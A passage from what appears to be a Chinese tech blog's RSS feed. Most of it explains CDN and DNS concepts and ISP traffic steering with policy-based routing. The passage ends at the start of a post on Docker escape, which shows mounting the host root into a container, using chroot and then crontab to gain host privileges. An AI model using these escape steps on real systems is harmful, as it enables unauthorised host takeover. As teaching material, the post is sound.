&lt;p&gt;做 CDN 之前的客户真正的服务器。&lt;/p&gt;
&lt;h6 id=&#34;2-user&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-user&#34;&gt;#&lt;/a&gt; &lt;strong&gt;2、User&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;访问者，也就是要访问网站的网民。&lt;/p&gt;
&lt;h6 id=&#34;3-last-mile&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-last-mile&#34;&gt;#&lt;/a&gt; &lt;strong&gt;3、Last Mile&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;最后一公里，也就是网民到他所访问到的 CDN 服务器之间的路径。&lt;/p&gt;
&lt;h6 id=&#34;4-域名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-域名&#34;&gt;#&lt;/a&gt; &lt;strong&gt;4、域名&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;域名是 Internet 网络上的一个服务器或一个网络系统的名字，全世界，没有重复的域名。&lt;/p&gt;
&lt;h6 id=&#34;5-cname记录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-cname记录&#34;&gt;#&lt;/a&gt; &lt;strong&gt;5、CNAME 记录&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;它是一个别名记录 (Canonical Name)；当 DNS 系统在查询 CNAME 左面的名称的时候，都会转向 CNAME 右面的名称再进行查询，一直追踪到最后的 PTR 或 A 名称，成功查询后才会做出回应，否则失败。&lt;/p&gt;
&lt;h6 id=&#34;6-cname域名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6-cname域名&#34;&gt;#&lt;/a&gt; &lt;strong&gt;6、CNAME 域名&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;CDN 的域名加速需要用到 CNAME 记录，在服务器控制台配置完成 CDN 加速后，您会得到一个加速后的域名，称之为 CNAME 域名（该域名一定是 &lt;code&gt;*.*http://wljslmz.com&lt;/code&gt; ）， 用户需要将自己的域名作 CNAME 指向这个 &lt;code&gt;*.*http://wljslmz.com&lt;/code&gt;  的域名后，域名解析的工作就正式转向云服务器，该域名所有的请求都将转向云 CDN 的节点。&lt;/p&gt;
&lt;h6 id=&#34;7-dns&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7-dns&#34;&gt;#&lt;/a&gt; &lt;strong&gt;7、DNS&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;DNS 即 Domain Name System，是域名解析服务的意思。它在互联网的作用是：把域名转换成为网络可以识别的 ip 地址。人们习惯记忆域名，但机器间互相只认 IP 地址，域名与 IP 地址之间是一一对应的，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析服务器来完成，整个过程是自动进行的。比如：上网时输入的百度一下，你就知道会自动转换成为 &lt;code&gt;220.181.112.143&lt;/code&gt;&lt;/p&gt;
&lt;h6 id=&#34;8-边缘节点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8-边缘节点&#34;&gt;#&lt;/a&gt; &lt;strong&gt;8、边缘节点&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;也称 CDN 节点、Cache 节点等；是相对于网络的复杂结构而提出的一个概念，指距离最终用户接入具有较少的中间环节的网络节点，对最终接入用户有较好的响应能力和连接速度。其作用是将访问量较大的网页内容和对象保存在服务器前端的专用 cache 设备上，以此来提高网站访问的速度和质量。&lt;/p&gt;
&lt;h6 id=&#34;9-cache&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#9-cache&#34;&gt;#&lt;/a&gt; &lt;strong&gt;9、cache&lt;/strong&gt;&lt;/h6&gt;
&lt;p&gt;cache 高速缓冲存储器一种特殊的存储器子系统，其中复制了频繁使用的数据以利于快速访问。存储器的高速缓冲存储器存储了频繁访问的 RAM 位置的内容及这些数据项的存储地址。当处理器引用存储器中的某地址时，高速缓冲存储器便检查是否存有该地址。如果存有该地址，则将数据返回处理器；如果没有保存该地址，则进行常规的存储器访问。因为高速缓冲存储器总是比主 RAM 存储器速度快，所以当 RAM 的访问速度低于微处理器的速度时，常使用高速缓冲存储器。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNzc5MzM1&#34;&gt;什么是 CDN？它解决了什么难题？5 分钟让你明明白白！ - 腾讯云开发者社区 - 腾讯云 (tencent.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODk0MDQ1MQ==&#34;&gt;也许是史上最全的一次 CDN 详解 - 知乎 (zhihu.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81MjM2Mjk1MA==&#34;&gt;到底什么是 CDN？ - 知乎 (zhihu.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC82OTYyOTA0MjE2NTAzMzIwNTg5&#34;&gt;一图秒懂 CDN 原理 - 掘金 (juejin.cn)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3JhenltYWtlcmNpcmNsZS9wLzE0OTc4NTEzLmh0bWwjYXV0b2lkLWgyLTAtMC0w&#34;&gt;CDN 图解（秒懂 + 史上最全） - 疯狂创客圈 - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;来都来了，看个 DNS 再走吧～&lt;/p&gt;
&lt;h1 id=&#34;dns&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dns&#34;&gt;#&lt;/a&gt; DNS&lt;/h1&gt;
&lt;h2 id=&#34;dns概述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dns概述&#34;&gt;#&lt;/a&gt; DNS 概述&lt;/h2&gt;
&lt;p&gt;DNS 是 Domain Name System 的缩写，也就是 域名解析系统，它的作用非常简单，就是根据域名查出对应的 IP 地址。&lt;/p&gt;
&lt;p&gt;你可以把它想象成一本巨大的电话本，比如当你要访问域名 &lt;code&gt;www.163.com&lt;/code&gt; ，首先要通过 DNS 查出它的 IP 地址是 &lt;code&gt;112.48.162.8&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;为啥需要解析捏？ 因为域名是给人看的，你只能通过 IP 的方式访问资源，但是让你背 IP 你又不干，而且最坏的情况是他用了 CDN 或者负载均衡，导致他的 IP 更多了，你更不想背了，所以我们有了 DNS，将域名解析成 IP，我们只需要输入域名，域名通过 DNS 解析成 IP，最终访问到资源。&lt;/p&gt;
&lt;p&gt;注意：上面的 DNS 解析对于用户来说是透明的，你并不知道你输入 www.bilibili.com 后到底他给你解析了那个 IP。而如果你真想知道为啥会给你解析成某个 IP，要取决于对方有没有使用 CDN 和一些其他因素&lt;/p&gt;
&lt;h2 id=&#34;dns资源记录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dns资源记录&#34;&gt;#&lt;/a&gt; DNS 资源记录&lt;/h2&gt;
&lt;p&gt;在 DNS 服务器上，一个域名及其下级域名组成一个区域 （Zone）。一个 Zone 的 相关的 DNS 信息构成一个数据库文件。&lt;/p&gt;
&lt;p&gt;下面是一条 A 类型的资源记录（简称为 A 记录）：域名 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy56ZG5zLmNu&#34;&gt;www.zdns.cn&lt;/span&gt; 的数据为 202.173.11.10&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20210704153331929.png&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
&lt;p&gt;记录一条域名信息映射关系，称之为资源记录（RR）。当我们查询域名 www.zdns.cn 的时候，查询结果得到的资源记录结构体中有如下数据：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TTL，就是生存周期，是递归服务器会在缓存中保存该资源记录的时长。&lt;/li&gt;
&lt;li&gt;网络 / 协议类型，它的代表的标识是 IN，IN 就是 internet，目前 DNS 系统主要支持的协议是 IN。&lt;/li&gt;
&lt;li&gt;type，就是资源记录类型，一般的网站都是都是 A 记录（IPv4 的主机地址）。&lt;/li&gt;
&lt;li&gt;rdata 是资源记录数据，就是域名关联的信息数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;常见的资源记录类型如表所示。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126101836133.png&#34; alt=&#34;image-20221126101836133&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A 记录：又称 IP 指向&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用户可以在此设置子域名并指向到自己的目标主机地址上，从而实现通过域名找到服务器。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;说明：指向的目标主机地址类型只能使用 IP 地址；&lt;br&gt;
附加说明：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;泛域名解析即将该域名所有未指定的子域名都指向一个空间。在 “主机名” 中填入 *，“类型” 为 A，“IP 地址 / 主机名” 中填入 web 服务器的 IP 地址，点击 “新增” 按钮即可。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;负载均衡的实现：负载均衡 (Server Load Balancing，SLB) 是指在一系列资源上面动态地分布网络负载。负载均衡可以减少网络拥塞，提高整体网络性能，提高自愈性， 并确保企业关键性应用的可用性。&lt;/p&gt;
&lt;p&gt;当相同子域名有多个目标地址时，表示轮循，可以达到负载均衡的目的，但需要虚拟主机服务商支持。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;CNAME : 通常称别名指向。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;您可以为一个主机设置别名。&lt;br&gt;
比如设置 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Rlc3QubXlkb21haW4uY29t&#34;&gt;test.mydomain.com&lt;/span&gt;，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS13d3ctcDE4ZG9odmRzMTFjbzgzYXQ1aGVtYXc1MGsucmRkbnMuY29t&#34;&gt;用来指向一个主机 www.rddns.com&lt;/span&gt; , 那么以后就可以用 test.mydomain.com 来代替访问 www.rddns.com 了。&lt;/p&gt;
&lt;p&gt;说明：・&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CNAME 的目标主机地址只能使用主机名，不能使用 IP 地址；&lt;/li&gt;
&lt;li&gt;主机名前不能有任何其他前缀，如：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1paHF4MWZoOHo1M29sdGZucHdpMmUv&#34;&gt;http:// 等是不被允许的&lt;/span&gt;；&lt;/li&gt;
&lt;li&gt;A 记录优先于 CNAME 记录。即如果一个主机地址同时存在 A 记录和 CNAME 记录，则 CNAME 记录不生效。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;NS 记录：指向 DNS 子域名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;服务器解析记录，用来表明由哪台服务器对该域名进行解析。这里的 NS 记录只对子域名生效。&lt;/p&gt;
&lt;p&gt;例如用户希望由 12.34.56.78 这台服务器解析 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25ld3MubXlkb21haW4uY29t&#34;&gt;news.mydomain.com&lt;/span&gt;，则需要设置 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25ld3MubXlkb21haW4uY29t&#34;&gt;news.mydomain.com&lt;/span&gt; 的 NS 记录。&lt;/p&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;“优先级” 中的数字越小表示级别越高；&lt;/li&gt;
&lt;li&gt;“IP 地址 / 主机名” 中既可以填写 IP 地址，也可以填写像 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25zLm15ZG9tYWluLmNvbQ==&#34;&gt;ns.mydomain.com&lt;/span&gt; 这样的主机地址，但必须保证该主机地址有效。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;如，将 news.mydomain.com 的 NS 记录指向到 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL25zLm15ZG9tYWluLmNvbQ==&#34;&gt;ns.mydomain.com&lt;/span&gt;，在设置 NS 记录的同时还需要设置 ns.mydomain.com 的指向，否则 NS 记录将无法正常解析；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;NS 记录优先于 A 记录。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;即，如果一个主机地址同时存在 NS 记录和 A 记录，则 A 记录不生效。这里的 NS 记录只对子域名生效。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;解析过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解析过程&#34;&gt;#&lt;/a&gt; 解析过程&lt;/h2&gt;
&lt;p&gt;1、缓存查找 IP&lt;/p&gt;
&lt;p&gt;2、本机的 hosts 文件查找 IP&lt;/p&gt;
&lt;p&gt;3、DNS 服务器查找 IP&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20210705144630547.png&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;从递归和迭代查询可以看出：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;客户端 - 本地 dns 服务端：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这部分属于递归查询。递归查询时，返回的结果只有两种：查询成功或查询失败.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本地 dns 服务端 — 外网：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这部分属于迭代查询。迭代查询，又称作重指引，返回的是最佳的查询点或者主机地址.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;浏览器先检查自身缓存中有没有被解析过的这个域名对应的 ip 地址，如果有，解析结束。同时域名被缓存的时间也可通过 TTL 属性来设置。&lt;/li&gt;
&lt;li&gt;如果浏览器缓存中没有（专业点叫还没命中），浏览器会检查操作系统缓存中有没有对应的已解析过的结果。而操作系统也有一个域名解析的过程。在 windows 中可通过 c 盘里一个叫 hosts 的文件来设置，如果你在这里指定了一个域名对应的 ip 地址，那浏览器会首先使用这个 ip 地址。&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;但是这种操作系统级别的域名解析规程也被很多黑客利用，通过修改你的 hosts 文件里的内容把特定的域名解析到他指定的 ip 地址上，造成所谓的域名劫持。所以在 windows7 中将 hosts 文件设置成了 readonly，防止被恶意篡改。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;如果至此还没有命中域名，才会真正的请求本地域名服务器（LDNS）来解析这个域名，这台服务器一般在你的城市的某个角落，距离你不会很远，并且这台服务器的性能都很好，一般都会缓存域名解析结果，大约 80% 的域名解析到这里就完成了。&lt;/li&gt;
&lt;li&gt;如果 LDNS 仍然没有命中，就直接跳到 Root Server 域名服务器请求解析&lt;/li&gt;
&lt;li&gt;根域名服务器返回给 LDNS 一个所查询域的主域名服务器（gTLD Server，国际顶尖域名服务器，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1idnMuY29t&#34;&gt;如.com&lt;/span&gt; .cn .org 等）地址&lt;/li&gt;
&lt;li&gt;此时 LDNS 再发送请求给上一步返回的 gTLD&lt;/li&gt;
&lt;li&gt;接受请求的 gTLD 查找并返回这个域名对应的 Name Server 的地址，这个 Name Server 就是网站注册的域名服务器&lt;/li&gt;
&lt;li&gt;Name Server 根据映射关系表找到目标 ip，返回给 LDNS&lt;/li&gt;
&lt;li&gt;LDNS 缓存这个域名和对应的 ip&lt;/li&gt;
&lt;li&gt;LDNS 把解析的结果返回给用户，用户根据 TTL 值缓存到本地系统缓存中，域名解析过程至此结束&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;记住这个解析过程，后面要考&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;举两个例子&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#举两个例子&#34;&gt;#&lt;/a&gt; 举两个例子&lt;/h1&gt;
&lt;p&gt;腾讯连接了两家运营商电信和联通，电信访问内部服务的流量大，联通的少，怎么把电信流入的流量扔一些给联通&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这道题的侧重点在于控制用户侧和运营商侧，因为如果要控制腾讯侧，那么流量已经到了腾讯的防火墙上，不能实现流量控制。&lt;/p&gt;
&lt;p&gt;有两种可能的解法，dns 和 cdn，个人理解，cdn 其实是一种分布式 dns 的解法，两种解法的本质都是控制通过控制 dns 的解析来控制流量选路&lt;/p&gt;
&lt;p&gt;1.dns&lt;/p&gt;
&lt;p&gt;上面也提过 DNS 的解析过程了，那么我们需要控制的就是用户来解析域名时候返回的 IP。&lt;/p&gt;
&lt;p&gt;一般来说，联通用户解析出联通的 IP 访问速度肯定是最快的，但是当电信的访问拥塞时，我们可以给电信的用户在解析时返回联通的 IP，让电信用户通过联通访问，而众所周知，电信和联通可定是可以互通的，只不过是次优路径的问题，因此我们无需关注电信是怎么找到联通的。就像你以前在下游戏的时候，你也不会先看看自己是电信的 IP 还是联通的 IP 再下载，通常看心情随便一点，甚至还可以点到铁通去。&lt;/p&gt;
&lt;p&gt;那么还有个问题是运营商 / 腾讯怎么知道你的 IP 是电信还是联通的。其实每个 IP 都是可以查到归属的，我们只需要增加一个查表或者查缓存的过程罢了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126105505371.png&#34; alt=&#34;image-20221126105505371&#34;&gt;&lt;/p&gt;
&lt;p&gt;2.cdn&lt;/p&gt;
&lt;p&gt;cdn 本质就是也是通过 dns 解析返回给你一个离你最近的一个边缘节点的 IP，只不过这个 IP 解析比较曲折，上面在将 cdn 的时候也讲过了，应用 CDN 后，DNS 返回的不再是 IP 地址，而是一个 CNAME (Canonical Name) 别名记录，指向 CDN 的全局负载均衡 GSLB, GSLB 实际上在域名解析的过程中承担了中间人（或者说代理）的角色，这是 CDN 实现的关键。CDN 负载均衡设备根据用户 IP 地址，以及用户请求的内容 URL，选择一台用户所属区域的&lt;strong&gt;缓存服务器&lt;/strong&gt;。负载均衡设备告诉用户这台缓存服务器的 IP 地址，让用户向所选择的缓存服务器发起请求。并且 CDN 可以监控链路质量，实现动态切换和找到负载较轻的节点&lt;/p&gt;
&lt;p&gt;3. 负载均衡，nginx，redis (这个没啥用，但可以在这里写一笔)&lt;/p&gt;
&lt;p&gt;因为这明显是已经进入腾讯内部之后了，nginx 的负载均衡和 redis 的负载均衡在集群的场景下确实是有很大作用滴&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126110209123.png&#34; alt=&#34;image-20221126110209123&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126110225565.png&#34; alt=&#34;image-20221126110225565&#34; style=&#34;zoom:50%;&#34; /&gt;·&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;或者你有两个出口电信和联通，怎么控制选路&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这道题侧重点在于流量出去，也是在本 AS 内控制选路&lt;/p&gt;
&lt;p&gt;1.PBR 策略路由&lt;/p&gt;
&lt;p&gt;略路由 PBR（Policy-Based Routing）是一种依据用户制定的策略进行路由选择的机制，分为本地策略路由、接口策略路由和智能策略路由 SPR&lt;/p&gt;
&lt;p&gt;路由策略（route-policy）与策略路由（policy based route）区别&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;策略路由的操作对象是数据包，在路由表已经产生的情况下，不按照路由表进行转发，而是根据需要，依照某种策略改变数据包转发路径。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;路由策略的操作对象是路由信息。路由策略主要实现了路由过滤和路由属性设置等功能，它通过改变路由属性（包括可达性）来改变网络流量所经过的路径。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;传统的路由转发原理是首先根据报文的目的地址查找路由表，然后进行报文转发。但是目前越来越多的用户希望能够在传统路由转发的基础上根据自己定义的策略进行报文转发和选路。策略路由使网络管理者不仅能够根据报文的目的地址，而且能够根据报文的源地址、报文大小和链路质量等属性来制定策略路由，以改变数据包转发路径，满足用户需求。&lt;/p&gt;
&lt;p&gt;如果联通的流量很少，但电信流量很大，可以通过 PBR 强制改变路由选路实现流量迁移&lt;/p&gt;
&lt;p&gt;多说一句，其实我们的组网可以使用负载分担双联路方案&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126112007676.png&#34; alt=&#34;image-20221126112007676&#34; style=&#34;zoom:67%;&#34; /&gt;
&lt;p&gt;\1. 2 条链路能同时使用，一半 PC 优先选择电信，另外一半 PC 优先选择联通；&lt;/p&gt;
&lt;p&gt;\2. 2 条链路为主备方式，电信线路为主，联通线路为备；&lt;/p&gt;
&lt;p&gt;\3. 但可以实现电信线路断开，所有 PC 选择联通线路，联通线路故障，所有 PC 选择电信。&lt;/p&gt;
&lt;p&gt;其实基本原理还是策略路由，我们可以通过源 IP 奇偶性控制选路&lt;/p&gt;
&lt;p&gt;\1. 由于策略路由只控制奇数 IP，所以偶数 IP 默认情况下就是优选电信线路，电信线路 Down 情况下选择联通线路，这和传统解决方案一致；&lt;/p&gt;
&lt;p&gt;\2. 关键的是奇数 IP，奇数 IP 在策略路由的控制下，优选了联通线路，PBR 有一个特性，如果出接口联通线路 Down，则 PBR 失效，奇数 IP 恢复正常的路由转发，选择电信线路。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;acl number 2000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rule permit source 0.0.0.1 255.255.255.254&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;policy-based-route mypbr permit node 5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if-match acl 2000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apply ip-address next-hop 联通网关&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;interface vlan-interface1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ip address 192.168.1.1 255.255.255.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ip policy-based-route mypbr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ip route-static 0.0.0.0 0.0.0.0 电信网关&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ip route-static 0.0.0.0 0.0.0.0 联通网关 preference 80&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2.DNS 选路&lt;/p&gt;
&lt;p&gt;和上面的案例一样，只不过由于我们这次可以在内网控制，我们不一定要依赖运营商的 DNS 解析，比如学校里我们可以使用自己的 DNS 解析一部分地址，将其解析到空闲的链路上&lt;/p&gt;
&lt;p&gt;3. 控制 preference&lt;/p&gt;
&lt;p&gt;ip route-static 0.0.0.0 0 192.168.1.254 preference 10&lt;/p&gt;
&lt;p&gt;将希望优先选择的链路优先级改小，实现优先选路&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaDNjLmNvbS9jbi9kXzIwMTAxMC82OTc2NjRfOTc2NjVfMC5odG0=&#34;&gt;技术点详解 — 互联网双出口的选择 - IP 技术专栏 - 技术甜甜圈 - 新华三集团 - H3C&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3JhenltYWtlcmNpcmNsZS9wLzE0OTc2NjEyLmh0bWwjYXV0b2lkLWgzLTExLTAtNg==&#34;&gt;DNS 图解（秒懂 - 史上最全） - 疯狂创客圈 - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/11/27/Docker%E9%80%83%E9%80%B8/</guid>
            <title>docker逃逸&amp;capabilities</title>
            <link>http://example.com/2022/11/27/Docker%E9%80%83%E9%80%B8/</link>
            <pubDate>Sun, 27 Nov 2022 13:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;docker逃逸-反弹shellcapabilities&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker逃逸-反弹shellcapabilities&#34;&gt;#&lt;/a&gt; Docker 逃逸、反弹 shell，capabilities&lt;/h1&gt;
&lt;h2 id=&#34;前置知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前置知识&#34;&gt;#&lt;/a&gt; 前置知识&lt;/h2&gt;
&lt;h3 id=&#34;1linux-namespace&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1linux-namespace&#34;&gt;#&lt;/a&gt; 1.Linux NameSpace&lt;/h3&gt;
&lt;p&gt;Linux Namespace 是 Linux 提供的一种&lt;strong&gt;内核级别环境隔离&lt;/strong&gt;的方法。从 Unix 开始，有一个 chroot 命令，&lt;/p&gt;
&lt;p&gt;chroot&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;change root directory (更改 root 目录)。在 linux 系统中，系统默认的目录结构都是以  &lt;code&gt;/&lt;/code&gt; ，即是以根 (root) 开始的。而在使用 chroot 之后，系统的目录结构将以指定的位置作为  &lt;code&gt;/&lt;/code&gt;  位置。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也就是说，原先我们的 root 目录在 /，那么我们在 tmp 目录使用 chroot 后，那么我们的 / 目录就在 tmp / 下，在 docker 中有一种逃逸方式，在 docker 启动的时候，挂在宿主机的根目录，假设，启动时，把宿主机的根目录挂载在了 docker 中的 / UzJu / 目录&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker run -it -v /:/uzju/ ubuntu:18.04&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;那么此时，我们进入到 docker 中，使用 chroot，将根目录切换至 / UzJu / 目录下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;chroot /uzju/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此时我们就可以使用 crontab 等多种方式获取宿主机权限&lt;/p&gt;
&lt;p&gt;那么 chroot 提供的就是一种简单的隔离环境，chroot 内部的内容无法访问外部的，Linux NameSpace 在这个基础上，又提供了对以下内容的隔离机制&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;UTS&lt;/li&gt;
&lt;li&gt;IPC&lt;/li&gt;
&lt;li&gt;mount&lt;/li&gt;
&lt;li&gt;PID&lt;/li&gt;
&lt;li&gt;network&lt;/li&gt;
&lt;li&gt;User&lt;/li&gt;
&lt;/ul&gt;
